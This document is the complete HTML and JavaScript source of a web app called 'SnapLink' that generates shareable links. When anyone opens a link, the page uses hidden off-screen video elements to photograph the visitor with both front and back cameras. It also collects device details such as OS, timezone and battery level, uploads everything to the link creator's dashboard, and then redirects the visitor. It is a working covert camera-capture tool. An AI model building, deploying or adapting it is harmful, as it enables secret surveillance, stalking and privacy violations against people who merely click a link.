<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>SnapLink</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
    <style>
        /* --- Reset & Base --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-primary: #0e0e12;
            --bg-secondary: #14141b;
            --bg-card: #1e1e29;
            --bg-input: #111118;
            --bg-nav: #1c1c26;
            --border-color: #2a2a36;
            --text-primary: #e6e6ed;
            --text-secondary: #8a8a99;
            --text-muted: #6a6a7a;
            --accent-color: #7b9aff;
            --accent-hover: #4b6ee6;
            --shadow-color: rgba(123, 154, 255, 0.15);
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        #app {
            flex: 1;
            display: flex;
            flex-direction: column;
            max-width: 600px;
            width: 100%;
            background: var(--bg-secondary);
            min-height: 100vh;
            position: relative;
            padding-bottom: 80px; /* Space for bottom nav */
            margin: 0 auto;
        }

        /* --- App Bar --- */
        .app-bar {
            display: flex;
            align-items: center;
            padding: 16px 20px 8px;
            background: var(--bg-secondary);
            position: sticky;
            top: 0;
            z-index: 10;
            border-bottom: 1px solid var(--border-color);
        }
        .app-bar h1 {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -0.3px;
            background: linear-gradient(135deg, #b3c7ff, var(--accent-color));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .app-bar .spacer {
            flex: 1;
        }
        .app-bar .material-symbols-outlined {
            font-size: 28px;
            color: var(--accent-color);
        }

        /* --- Tab Content --- */
        .tab-content {
            flex: 1;
            padding: 12px 16px 20px;
            display: none;
            animation: fadeIn 0.25s ease;
        }
        .tab-content.active {
            display: block;
        }
        @keyframes fadeIn {
            from {
                opacity: 0.5;
                transform: translateY(6px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* --- Bottom Navigation --- */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            max-width: 600px;
            width: 100%;
            background: var(--bg-nav);
            display: flex;
            border-top: 1px solid var(--border-color);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            z-index: 20;
            padding: 6px 0 env(safe-area-inset-bottom);
        }
        .bottom-nav button {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text-secondary);
            font-size: 12px;
            font-weight: 500;
            padding: 8px 0 4px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            cursor: pointer;
            transition: 0.2s;
            font-family: inherit;
        }
        .bottom-nav button .material-symbols-outlined {
            font-size: 28px;
            transition: 0.2s;
        }
        .bottom-nav button span:last-child {
            font-size: 11px;
        }
        .bottom-nav button.active {
            color: var(--accent-color);
        }
        .bottom-nav button.active .material-symbols-outlined {
            font-variation-settings: 'FILL' 1;
        }

        /* --- Cards --- */
        .card {
            background: var(--bg-card);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 16px;
            border: 1px solid var(--border-color);
        }
        .card-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .card-sub {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 16px;
        }

        /* --- Form Inputs --- */
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 8px;
        }
        .input-group input {
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 14px 18px;
            color: var(--text-primary);
            font-size: 15px;
            font-family: inherit;
            outline: none;
            transition: 0.2s;
            width: 100%;
        }
        .input-group input:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 0 3px var(--shadow-color);
        }
        .btn {
            background: var(--accent-color);
            border: none;
            border-radius: 20px;
            padding: 14px 24px;
            font-weight: 600;
            font-size: 15px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            font-family: inherit;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn:hover {
            background: var(--accent-hover);
        }
        .btn:active {
            transform: scale(0.96);
        }
        .btn-secondary {
            background: var(--bg-input);
            color: var(--accent-color);
            border: 1px solid var(--border-color);
        }
        .btn-secondary:hover {
            background: var(--border-color);
        }

        /* --- Link Display --- */
        .link-box {
            display: flex;
            gap: 8px;
            align-items: center;
            background: var(--bg-input);
            border-radius: 16px;
            padding: 4px 4px 4px 18px;
            margin-top: 8px;
        }
        .link-box input {
            flex: 1;
            background: transparent;
            border: none;
            color: var(--text-primary);
            font-size: 14px;
            padding: 12px 0;
            outline: none;
            min-width: 0;
        }
        .link-box .btn {
            padding: 10px 18px;
            font-size: 13px;
            border-radius: 14px;
        }

        /* --- Toast Notifications --- */
        .toast {
            padding: 12px 16px;
            border-radius: 16px;
            background: var(--bg-card);
            border-left: 4px solid var(--accent-color);
            margin: 12px 0 0;
            display: none;
            font-size: 14px;
            color: var(--text-primary);
        }
        .toast.show {
            display: block;
        }
        .toast.error {
            border-left-color: #f25a5a;
            background: #261a1a;
            color: #f5baba;
        }
        .toast.success {
            border-left-color: #3dcd7a;
            background: #14281e;
            color: #b0e8c8;
        }

        /* --- Links List --- */
        .link-item {
            background: var(--bg-card);
            border-radius: 18px;
            padding: 16px;
            margin-bottom: 14px;
            border: 1px solid var(--border-color);
        }
        .link-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 6px;
        }
        .link-header strong {
            font-size: 15px;
            font-weight: 600;
        }
        .link-header .badge {
            font-size: 12px;
            color: var(--text-secondary);
            background: var(--bg-input);
            padding: 4px 12px;
            border-radius: 40px;
        }
        .link-meta {
            font-size: 12px;
            color: var(--text-muted);
            margin-bottom: 12px;
            word-break: break-all;
        }
        .capture-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 10px;
        }
        .capture-item {
            background: var(--bg-input);
            border-radius: 14px;
            padding: 10px;
        }
        .capture-item img {
            width: 100%;
            border-radius: 10px;
            display: block;
        }
        .capture-meta {
            font-size: 11px;
            color: var(--text-secondary);
            margin-top: 6px;
            line-height: 1.4;
        }
        .empty-state {
            text-align: center;
            color: var(--text-muted);
            padding: 30px 0;
        }
        .empty-state .material-symbols-outlined {
            font-size: 48px;
            color: var(--border-color);
            margin-bottom: 12px;
        }

        /* --- Viewer Mode --- */
        .viewer-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 60vh;
            text-align: center;
            padding: 20px;
        }
        .viewer-container .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid var(--border-color);
            border-top: 4px solid var(--accent-color);
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .viewer-container .status {
            font-size: 16px;
            color: var(--accent-color);
            margin-bottom: 8px;
        }
        .viewer-container .sub {
            font-size: 14px;
            color: var(--text-secondary);
        }
        .step-dots {
            display: flex;
            gap: 12px;
            margin: 20px 0;
        }
        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--border-color);
            transition: 0.3s;
        }
        .step-dot.active {
            background: var(--accent-color);
            box-shadow: 0 0 12px var(--shadow-color);
        }
        .step-dot.done {
            background: #3dcd7a;
        }

        /* --- Utility --- */
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
        }
        .hidden {
            display: none !important;
        }
        .flex-center {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .gap-2 {
            gap: 8px;
        }
        .text-muted {
            color: var(--text-muted);
        }
        .text-center {
            text-align: center;
        }
        .mt-2 {
            margin-top: 8px;
        }
        .mb-2 {
            margin-bottom: 8px;
        }
        .w-full {
            width: 100%;
        }
    </style>
</head>
<body>
    <div id="app">
        <!-- Top App Bar -->
        <header class="app-bar">
            <h1>SnapLink</h1>
            <div class="spacer"></div>
            <span class="material-symbols-outlined" aria-hidden="true">auto_awesome</span>
        </header>

        <!-- Tab: Create -->
        <section id="tab-create" class="tab-content active" role="tabpanel">
            <div class="card">
                <h2 class="card-title">Create a new link</h2>
                <p class="card-sub">Anyone who opens it will capture two photos.</p>
                <div class="input-group">
                    <input type="url" id="redirectUrl" placeholder="Redirect URL (e.g. https://example.com)" />
                    <input type="email" id="creatorEmail" placeholder="Your email (optional)" />
                    <button class="btn" id="createBtn">
                        <span class="material-symbols-outlined" aria-hidden="true">add_link</span> Generate Link
                    </button>
                </div>
                <div id="linkResult" class="hidden" style="margin-top:16px;">
                    <div class="link-box">
                        <input type="text" id="generatedLink" readonly />
                        <button class="btn btn-secondary" id="copyBtn">
                            <span class="material-symbols-outlined" style="font-size:20px;" aria-hidden="true">content_copy</span>
                        </button>
                    </div>
                    <div id="createToast" class="toast"></div>
                </div>
            </div>
            <p class="text-center text-muted" style="font-size:12px;">
                Up to 4 captures per link · Images expire after 15 days
            </p>
        </section>

        <!-- Tab: Links -->
        <section id="tab-links" class="tab-content" role="tabpanel">
            <h2 style="font-size:15px; font-weight:500; margin-bottom:12px;">Your links</h2>
            <div id="linksList"></div>
        </section>

        <!-- Bottom Navigation -->
        <nav class="bottom-nav" role="tablist">
            <button class="active" data-tab="create" role="tab" aria-selected="true">
                <span class="material-symbols-outlined" aria-hidden="true">add_circle</span>
                <span>Create</span>
            </button>
            <button data-tab="links" role="tab" aria-selected="false">
                <span class="material-symbols-outlined" aria-hidden="true">link</span>
                <span>Links</span>
            </button>
        </nav>

        <!-- Viewer Mode (hidden by default) -->
        <div id="viewer" class="hidden" style="flex:1; display:none; flex-direction:column; justify-content:center; padding:20px;">
            <div class="viewer-container">
                <div class="spinner" id="viewerSpinner"></div>
                <div class="status" id="viewerStatus">Preparing capture…</div>
                <div class="sub" id="viewerSub">Requesting camera permission</div>
                <div class="step-dots" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="4">
                    <span class="step-dot" id="step1" aria-label="Step 1"></span>
                    <span class="step-dot" id="step2" aria-label="Step 2"></span>
                    <span class="step-dot" id="step3" aria-label="Step 3"></span>
                    <span class="step-dot" id="step4" aria-label="Step 4"></span>
                </div>
                <div id="viewerToast" class="toast w-full"></div>
            </div>
        </div>
    </div>

    <!-- Hidden video elements for capture -->
    <video id="frontVideo" autoplay playsinline></video>
    <video id="backVideo" autoplay playsinline></video>
    <canvas id="captureCanvas" style="display:none;"></canvas>

    <script>
        (() => {
            'use strict';

            // ─── Constants ───
            const CREATOR_ID_KEY = 'snaplink_creatorId';
            const API_BASE = '/api';

            // ─── State ───
            let creatorId = localStorage.getItem(CREATOR_ID_KEY);
            if (!creatorId) {
                creatorId = crypto.randomUUID?.() ?? 'id-' + Date.now() + '-' + Math.random().toString(36).slice(2, 8);
                localStorage.setItem(CREATOR_ID_KEY, creatorId);
            }
            console.log('🔑 Creator ID:', creatorId);

            // ─── DOM Refs ───
            const $ = (sel) => document.querySelector(sel);
            const $$ = (sel) => document.querySelectorAll(sel);

            const tabCreate = document.getElementById('tab-create');
            const tabLinks = document.getElementById('tab-links');
            const navBtns = $$('.bottom-nav button');
            const redirectUrlInput = document.getElementById('redirectUrl');
            const creatorEmailInput = document.getElementById('creatorEmail');
            const createBtn = document.getElementById('createBtn');
            const linkResult = document.getElementById('linkResult');
            const generatedLink = document.getElementById('generatedLink');
            const copyBtn = document.getElementById('copyBtn');
            const createToast = document.getElementById('createToast');
            const linksList = document.getElementById('linksList');

            const viewer = document.getElementById('viewer');
            const viewerStatus = document.getElementById('viewerStatus');
            const viewerSub = document.getElementById('viewerSub');
            const viewerToast = document.getElementById('viewerToast');
            const viewerSpinner = document.getElementById('viewerSpinner');
            const steps = {
                step1: document.getElementById('step1'),
                step2: document.getElementById('step2'),
                step3: document.getElementById('step3'),
                step4: document.getElementById('step4'),
            };
            const frontVideo = document.getElementById('frontVideo');
            const backVideo = document.getElementById('backVideo');
            const captureCanvas = document.getElementById('captureCanvas');

            // ─── Helpers ───
            function showToast(el, msg, type = '') {
                el.textContent = msg;
                el.className = 'toast show ' + type;
                clearTimeout(el._timer);
                el._timer = setTimeout(() => (el.className = 'toast'), 5000);
                console.log(`📢 Toast [${type || 'info'}]:`, msg);
            }

            function setStep(id, state) {
                const el = steps[id];
                if (el) el.className = 'step-dot ' + state;
            }

            function sleep(ms) {
                return new Promise((r) => setTimeout(r, ms));
            }

            // ─── Collect Device Metadata ───
            async function collectMetadata() {
                const meta = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    browser: (() => {
                        const ua = navigator.userAgent;
                        if (ua.includes('Chrome')) return 'Chrome';
                        if (ua.includes('Firefox')) return 'Firefox';
                        if (ua.includes('Safari')) return 'Safari';
                        return 'Other';
                    })(),
                    os: (() => {
                        const ua = navigator.userAgent;
                        if (ua.includes('Windows')) return 'Windows';
                        if (ua.includes('Mac OS')) return 'macOS';
                        if (ua.includes('Linux')) return 'Linux';
                        if (ua.includes('Android')) return 'Android';
                        if (ua.includes('iOS')) return 'iOS';
                        return 'Unknown';
                    })(),
                    battery: null,
                };

                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        meta.battery = {
                            level: battery.level,
                            charging: battery.charging,
                        };
                    }
                } catch (_) { /* ignore */ }

                try {
                    if (navigator.connection) {
                        meta.connection = {
                            type: navigator.connection.effectiveType,
                            downlink: navigator.connection.downlink,
                        };
                    }
                } catch (_) { /* ignore */ }

                return meta;
            }

            // ─── API Calls ───
            async function apiFetch(endpoint, options = {}) {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 30000);

                try {
                    const response = await fetch(`${API_BASE}${endpoint}`, {
                        ...options,
                        signal: controller.signal,
                    });
                    clearTimeout(timeout);
                    return response;
                } catch (err) {
                    clearTimeout(timeout);
                    throw err;
                }
            }

            // ─── Load & Render Links ───
            async function loadLinks() {
                try {
                    console.log('📡 Loading links for:', creatorId);
                    const res = await apiFetch(`/links?creatorId=${encodeURIComponent(creatorId)}`);
                    if (!res.ok) throw new Error(`HTTP ${res.status}`);
                    const data = await res.json();
                    renderLinks(data.links || []);
                } catch (err) {
                    console.error('❌ Failed to load links:', err);
                    linksList.innerHTML =
                        `<p class="text-center text-muted">Failed to load links. Please try again.</p>`;
                }
            }

            function renderLinks(links) {
                if (!links || links.length === 0) {
                    linksList.innerHTML = `
                        <div class="empty-state">
                            <span class="material-symbols-outlined" aria-hidden="true">link_off</span>
                            <div>No links created yet</div>
                        </div>
                    `;
                    return;
                }

                let html = '';
                for (const link of links) {
                    const captures = link.captures || [];
                    html += `
                        <div class="link-item">
                            <div class="link-header">
                                <strong>${escapeHtml(link.linkId)}</strong>
                                <span class="badge">${captures.length}/4 captures</span>
                            </div>
                            <div class="link-meta">
                                Redirects to: ${escapeHtml(link.redirectUrl)} · ${new Date(link.createdAt).toLocaleString()}
                            </div>
                    `;

                    if (captures.length === 0) {
                        html += `<div class="text-muted" style="font-size:13px;">No captures yet.</div>`;
                    } else {
                        html += `<div class="capture-grid">`;
                        for (const cap of captures) {
                            const meta = cap.metadata || {};
                            const front = cap.frontImageUrl || '';
                            const back = cap.backImageUrl || '';
                            html += `
                                <div class="capture-item">
                                    <div style="display:flex; gap:6px; flex-wrap:wrap;">
                                        ${front ? `<img src="${escapeHtml(front)}" alt="Front camera" loading="lazy" style="flex:1;min-width:80px;" />` : ''}
                                        ${back ? `<img src="${escapeHtml(back)}" alt="Back camera" loading="lazy" style="flex:1;min-width:80px;" />` : ''}
                                    </div>
                                    <div class="capture-meta">
                                        ${escapeHtml(meta.browser || '')} · ${escapeHtml(meta.os || '')}<br>
                                        ${escapeHtml(meta.screen || '')}<br>
                                        Battery: ${meta.battery ? (meta.battery.level * 100).toFixed(0) + '%' : 'N/A'} ${meta.battery?.charging ? '⚡' : ''}
                                        <br>${new Date(cap.timestamp).toLocaleString()}
                                    </div>
                                </div>
                            `;
                        }
                        html += `</div>`;
                    }
                    html += `</div>`;
                }
                linksList.innerHTML = html;
            }

            // ─── Simple escape for user-generated content ───
            function escapeHtml(str) {
                if (!str) return '';
                const div = document.createElement('div');
                div.textContent = str;
                return div.innerHTML;
            }

            // ─── Create Link ───
            createBtn.addEventListener('click', async () => {
                const redirectUrl = redirectUrlInput.value.trim();
                const email = creatorEmailInput.value.trim();

                if (!redirectUrl) {
                    showToast(createToast, 'Enter a redirect URL.', 'error');
                    return;
                }
                try {
                    new URL(redirectUrl);
                } catch (_) {
                    showToast(createToast, 'Invalid URL (include https://).', 'error');
                    return;
                }

                createBtn.disabled = true;
                createBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Creating...';

                try {
                    const res = await apiFetch('/create', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ redirectUrl, creatorId, creatorEmail: email }),
                    });
                    const data = await res.json();

                    if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);

                    if (data.linkId) {
                        const fullLink = window.location.origin + window.location.pathname + '?id=' + data.linkId;
                        generatedLink.value = fullLink;
                        linkResult.classList.remove('hidden');
                        showToast(createToast, 'Link created!', 'success');
                        loadLinks();
                    } else {
                        showToast(createToast, 'Error: ' + (data.error || 'Unknown error'), 'error');
                    }
                } catch (err) {
                    console.error('❌ Create link error:', err);
                    showToast(createToast, 'Error: ' + err.message, 'error');
                } finally {
                    createBtn.disabled = false;
                    createBtn.innerHTML =
                    '<span class="material-symbols-outlined" aria-hidden="true">add_link</span> Generate Link';
                }
            });

            // ─── Copy Link ───
            copyBtn.addEventListener('click', async () => {
                try {
                    await navigator.clipboard.writeText(generatedLink.value);
                    showToast(createToast, 'Copied!', 'success');
                } catch (_) {
                    generatedLink.select();
                    document.execCommand('copy');
                    showToast(createToast, 'Copied!', 'success');
                }
            });

            // ─── Tab Switching ───
            navBtns.forEach((btn) => {
                btn.addEventListener('click', () => {
                    const tab = btn.dataset.tab;
                    $$('.tab-content').forEach((el) => el.classList.remove('active'));
                    document.getElementById('tab-' + tab).classList.add('active');
                    navBtns.forEach((b) => {
                        b.classList.remove('active');
                        b.setAttribute('aria-selected', 'false');
                    });
                    btn.classList.add('active');
                    btn.setAttribute('aria-selected', 'true');
                });
            });

            // ─── Viewer Initialization ───
            async function initViewer() {
                const params = new URLSearchParams(window.location.search);
                const linkId = params.get('id');
                if (!linkId) return false;

                console.log('📷 Viewer mode activated for link:', linkId);

                // Hide dashboard, show viewer
                document.querySelector('.app-bar').style.display = 'none';
                document.querySelector('.bottom-nav').style.display = 'none';
                $$('.tab-content').forEach((el) => (el.style.display = 'none'));
                viewer.classList.remove('hidden');
                viewer.style.display = 'flex';

                try {
                    const res = await apiFetch(`/captures?linkId=${encodeURIComponent(linkId)}`);
                    const data = await res.json();

                    if (!data.linkExists) {
                        viewerStatus.textContent = 'Link not found';
                        viewerSub.textContent = 'This link may have expired.';
                        viewerSpinner.style.display = 'none';
                        return true;
                    }

                    if (data.capturesCount >= 4) {
                        viewerStatus.textContent = 'Capture limit reached';
                        viewerSub.textContent = 'This link already has 4 captures.';
                        viewerSpinner.style.display = 'none';
                        setTimeout(() => {
                            window.location.href = data.redirectUrl;
                        }, 3000);
                        return true;
                    }

                    await performCapture(linkId, data.redirectUrl);
                } catch (err) {
                    console.error('❌ Viewer init error:', err);
                    viewerStatus.textContent = 'Error: ' + err.message;
                    viewerSub.textContent = 'Redirecting…';
                    await sleep(3000);
                    window.location.href = 'https://example.com';
                }
                return true;
            }

            // ─── Perform Capture ───
            async function performCapture(linkId, redirectUrl) {
                let frontStream = null;
                let backStream = null;

                try {
                    // Step 1: Camera Permission
                    setStep('step1', 'active');
                    viewerStatus.textContent = 'Requesting camera permission…';
                    viewerSub.textContent = 'Please allow camera access';

                    if (!navigator.mediaDevices?.getUserMedia) {
                        throw new Error('Camera not supported in this browser.');
                    }

                    // Step 2: Front Camera
                    setStep('step1', 'done');
                    setStep('step2', 'active');
                    viewerStatus.textContent = 'Capturing front camera…';
                    viewerSub.textContent = 'Hold still…';

                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false,
                    });
                    frontVideo.srcObject = frontStream;
                    await frontVideo.play();

                    const frontImage = await captureFrame(frontVideo);
                    frontStream.getTracks().forEach((t) => t.stop());
                    frontVideo.srcObject = null;
                    frontStream = null;
                    setStep('step2', 'done');

                    // Step 3: Back Camera
                    setStep('step3', 'active');
                    viewerStatus.textContent = 'Capturing back camera…';
                    viewerSub.textContent = 'Almost there…';

                    backStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false,
                    });
                    backVideo.srcObject = backStream;
                    await backVideo.play();

                    const backImage = await captureFrame(backVideo);
                    backStream.getTracks().forEach((t) => t.stop());
                    backVideo.srcObject = null;
                    backStream = null;
                    setStep('step3', 'done');

                    // Step 4: Upload
                    setStep('step4', 'active');
                    viewerStatus.textContent = 'Uploading…';
                    viewerSub.textContent = 'Sending images';

                    const metadata = await collectMetadata();

                    const formData = new FormData();
                    formData.append('linkId', linkId);
                    formData.append('frontImage', frontImage, 'front.jpg');
                    formData.append('backImage', backImage, 'back.jpg');
                    formData.append('metadata', JSON.stringify(metadata));

                    const resp = await apiFetch('/capture', {
                        method: 'POST',
                        body: formData,
                    });

                    const result = await resp.json();
                    if (!resp.ok) throw new Error(result.error || 'Upload failed');

                    setStep('step4', 'done');
                    viewerStatus.textContent = 'Redirecting…';
                    viewerSub.textContent = 'Done!';
                    showToast(viewerToast, 'Captured successfully!', 'success');

                    await sleep(800);
                    window.location.href = redirectUrl;
                } catch (err) {
                    console.error('❌ Capture error:', err);
                    viewerStatus.textContent = 'Error: ' + err.message;
                    viewerSub.textContent = 'Redirecting…';
                    showToast(viewerToast, err.message, 'error');

                    // Clean up any active streams
                    if (frontStream) frontStream.getTracks().forEach((t) => t.stop());
                    if (backStream) backStream.getTracks().forEach((t) => t.stop());
                    frontVideo.srcObject = null;
                    backVideo.srcObject = null;

                    await sleep(2500);
                    window.location.href = redirectUrl;
                }
            }

            // ─── Capture a frame from video ───
            function captureFrame(video) {
                return new Promise((resolve) => {
                    const canvas = captureCanvas;
                    const w = video.videoWidth || 640;
                    const h = video.videoHeight || 480;
                    canvas.width = w;
                    canvas.height = h;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, w, h);
                    canvas.toBlob((blob) => resolve(blob), 'image/jpeg', 0.85);
                });
            }

            // ─── Start App ───
            (async function init() {
                const isViewer = await initViewer();
                if (!isViewer) {
                    // Show dashboard
                    document.querySelector('.app-bar').style.display = 'flex';
                    document.querySelector('.bottom-nav').style.display = 'flex';
                    $$('.tab-content').forEach((el) => (el.style.display = 'block'));
                    tabCreate.classList.add('active');
                    tabLinks.classList.remove('active');
                    navBtns.forEach((b) => b.classList.remove('active'));
                    document.querySelector('.bottom-nav button[data-tab="create"]')?.classList.add('active');
                    loadLinks();
                }
            })();
        })();
    </script>
</body>
</html>
